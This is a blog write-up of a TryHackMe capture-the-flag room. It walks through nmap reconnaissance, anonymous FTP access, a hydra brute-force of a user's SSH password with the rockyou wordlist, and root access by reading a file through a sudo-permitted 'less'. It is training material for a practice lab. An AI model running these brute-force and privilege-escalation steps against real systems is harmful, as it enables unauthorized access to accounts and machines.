<!doctype html><html lang=en><head><title>Brooklyn Nine Nine - Write Up ::
Lanfran02 - Blog — A place to look for write-ups.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Level Creator     Here Easy Fsociety2006    Reconn Using nmap we can detect an FTP server with the anonymous user activated.
╰─ lanfran@parrot ❯ map 10.10.79.24 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 12:41 CEST Nmap scan report for 10.10.79.24 Host is up (0.055s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/posts/brooklynninenine/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/brooklynninenine/cover.jpeg"><meta name=twitter:title content="Brooklyn Nine Nine - Write Up"><meta name=twitter:description content="TryHackMe's easy level machine."><meta property="og:title" content="Brooklyn Nine Nine - Write Up"><meta property="og:description" content="TryHackMe's easy level machine."><meta property="og:type" content="article"><meta property="og:url" content="/posts/brooklynninenine/"><meta property="og:image" content="/posts/brooklynninenine/cover.jpeg"><meta property="article:published_time" content="2021-07-03T16:53:59+02:00"><meta property="article:modified_time" content="2021-07-03T16:53:59+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-3T7DYCWC0W','auto');ga('send','pageview');}</script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','G-3T7DYCWC0W','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span></a><span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Brooklyn Nine Nine - Write Up</h1><div class=post-meta><span class=post-date>2021-07-03</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 3 min read</span></div><span class=post-tags><a href=/tags/hydra/>#hydra</a>&nbsp;
<a href=/tags/ftp/>#FTP</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/less/>#less</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/posts/brooklynninenine/cover.jpeg alt="Brooklyn Nine Nine - Write Up"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconn>Reconn</a></li><li><a href=#foothold---user>Foothold - User</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Level</th><th>Creator</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/brooklynninenine>Here</a></td><td>Easy</td><td><a href=https://tryhackme.com/p/Fsociety2006>Fsociety2006</a></td></tr></tbody></table><h2 id=reconn>Reconn</h2><p>Using <code>nmap</code> we can detect an FTP server with the <em>anonymous</em> user activated.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.79.24                                                                                                ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-04 12:41 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.79.24
Host is up <span style=color:#f92672>(</span>0.055s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
|_-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>119</span> May <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2020</span> note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.6.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style=color:#ae81ff>300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style=color:#ae81ff>1</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 36.25 seconds
</code></pre></div><p>I logged to the FTP and downloaded the file inside.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ftp 10.10.79.24                                                                                                ─╯
Connected to 10.10.79.24.
<span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>10.10.79.24:lanfran<span style=color:#f92672>)</span>: anonymous
<span style=color:#ae81ff>331</span> Please specify the password.
Password:
<span style=color:#ae81ff>230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
<span style=color:#ae81ff>200</span> PORT command successful. Consider using PASV.
<span style=color:#ae81ff>150</span> Here comes the directory listing.
drwxr-xr-x    <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>114</span>          <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2020</span> .
drwxr-xr-x    <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>114</span>          <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2020</span> ..
-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>             <span style=color:#ae81ff>119</span> May <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2020</span> note_to_jake.txt
<span style=color:#ae81ff>226</span> Directory send OK.
ftp&gt; get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
<span style=color:#ae81ff>200</span> PORT command successful. Consider using PASV.
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> note_to_jake.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>119</span> bytes<span style=color:#f92672>)</span>.
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>119</span> bytes received in 0.14 secs <span style=color:#f92672>(</span>0.8191 kB/s<span style=color:#f92672>)</span>
ftp&gt; 
</code></pre></div><h2 id=foothold---user>Foothold - User</h2><p>Reading the note, we get the name of 2 users, <code>Jake and Amy</code>, and Amy said to jake that his password is too weak.</p><p>So let&rsquo;s use <strong>hydra</strong> against the SSH with the user Jake and the wordlist <em>Rockyou</em></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.79.24                                            ─╯
Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.

Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2021-07-04 12:49:06
<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://10.10.79.24:22/
<span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 10.10.79.24   login: jake   password: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>

</code></pre></div><p>Great! We have now the password for Jake!</p><p>Let&rsquo;s login, and retrieve the user&rsquo;s flag that&rsquo;s inside <code>/home/holt/user.txt</code></p><h2 id=root>Root</h2><p>Once inside the machine, I ran <code>sudo -l</code> to check if the user it&rsquo;s inside the sudoers file. Luckily he is!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User jake may run the following commands on brookly_nine_nine:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/less
</code></pre></div><p>So let&rsquo;s read the root&rsquo;s flag with <code>less</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>

Enjoy!!
/root/root.txt <span style=color:#f92672>(</span>END<span style=color:#f92672>)</span>
</code></pre></div><p>And that&rsquo;s it!</p><p>We rooted the machine!</p><p>That&rsquo;s all from my side, hope you find this helpful!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/posts/cat-pictures/><span class=button__icon>←</span>
<span class=button__text>Cat Pictures - Write Up</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user">Lanfran02</div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-3T7DYCWC0W','auto');ga('send','pageview');}</script></body></html>